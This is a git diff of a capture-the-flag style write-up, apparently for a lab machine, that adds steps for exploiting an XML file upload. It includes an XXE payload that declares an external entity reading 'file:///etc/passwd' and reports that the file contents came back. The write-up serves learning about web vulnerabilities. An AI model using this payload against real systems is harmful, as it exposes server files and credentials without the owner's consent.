@@ -136,21 +136,29 @@ Lets create a php file
 <script>document.getElementById("cmd").focus();</script>
 </html>
 ```
-Lets upload this and see what happens
+Lets upload this and see what happens, we'll capture this request and send it over to burp repeater
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3ad6eb42-9851-4364-ae60-56e310e8c0e9)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a38d5d92-3ccb-4750-b76a-ab14515bd56a)
 
 oops, we get the "invalid xml example" error. Well, this means the accepted file extension is xml.
 
-Lets see if this is true, we'll create a simple xml file
+We can see from the response we got on burpsuite the xml format we are to use
+
+we'll create a simple xml file using that format
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<person>
-  <name>BlackAnon</name>
-  <age>26</age>
-  <email>blackanon@vawulence.com</email>
-</person>
+<post>
+<title>
+  BlackAnon's Info
+</title>
+<description>
+  BlackAnon is 26 years of age
+</description>
+<markdown>
+  This is a markdown
+</markdown>
+</post> 
 ```
 Well, that's my age right there hehe.
 
@@ -158,10 +166,39 @@ Save this in a file "info.xml"
 
 After uploading, you should see this
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9f065f0b-1517-4df4-917c-b3210e0f6650)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/12ce2d59-7ded-4ebf-b996-84e3c06ed148)
 
-Well, this means we successfully uploaded the file
+As you can see our xml file got executed successfully.
 
+Ever heard of XML external entity injection?
+
+<font color="Green">XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
+</font>
+
+This means we can cook up a payload that can help us read files
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<post>
+<title>
+  BlackAnon's Info
+</title>
+<description>
+  &read;
+</description>
+<markdown>
+  This is a markdown
+</markdown>
+</post> 
+```
+Save this in a file "abeg.xml"
+
+Now lets upload
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/30d0614a-0165-42cf-bfbc-2aa2cf6342c8)
+
+Nice Nice, it worked
 
 
 
